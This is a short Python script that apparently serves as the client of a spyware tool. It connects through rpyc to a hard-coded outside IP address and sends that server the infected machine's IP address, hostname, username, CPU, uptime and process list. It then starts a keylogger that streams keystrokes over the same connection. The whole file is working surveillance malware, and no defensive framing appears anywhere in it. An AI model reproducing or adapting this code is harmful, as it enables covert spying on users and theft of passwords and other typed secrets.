import rpyc
import platform
import socket
import re
from includes.keylog import *
from includes.wininfo import *

def main():
    
    conn = connect("67.23.25.86")
    
    tmp_header = "=" * (abs(int(len("NEW USER CONNECTED!")) - 60) / 2 )
    conn.modules.sys.stdout.write("\n" + tmp_header  + "NEW USER CONNECTED!" + tmp_header + "\n\n")
    
    windows = WinInfo()
    message_header = "=" * 60 
    
    ##
    title = " **Connection Information** "
    tmp_header = "=" * (abs(int(len(title)) - 60) / 2 )
    conn.modules.sys.stdout.write(tmp_header  + title + tmp_header)
    ##
    
    remoteip= "\nIP Address: %s\n" % (socket.gethostbyname_ex(socket.gethostname())[2][0])
    hostname = "Hostname: %s\n" % (socket.gethostname()) 
    raw_cpu = "CPU: %s" % (windows.get_Cpu())
    cpu = re.sub("\s+" , " ", raw_cpu) + "\n"
    username = "UserName: %s\n" % (windows.get_display_name())
    system_uptime = "System Uptime: %s\n" % (windows.systemUptime())
    
    conn.modules.sys.stdout.write(remoteip)
    conn.modules.sys.stdout.write(hostname)
    conn.modules.sys.stdout.write(username)
    conn.modules.sys.stdout.write(cpu)



    conn.modules.sys.stdout.write(system_uptime)

    ##
    title = "Process List"
    tmp_header = "=" * (abs(int(len(title)) - 60) / 2 )
    process_list = windows.processList().__str__()
    conn.modules.sys.stdout.write(tmp_header  + title + tmp_header)
    conn.modules.sys.stdout.write(process_list)
    ##
    
    ## KEY LoG
    logger = Keylog(conn)
    logger.setDaemon(False)
    title = "Key Logger Started"
    tmp_header = "=" * (abs(int(len(title)) - 60) / 2 )
    conn.modules.sys.stdout.write(tmp_header  + title + tmp_header + "\n")
    logger.start()
    ##
    
    
    
def connect(server):
    return rpyc.classic.connect(server)
    

if __name__ == "__main__":
    main()
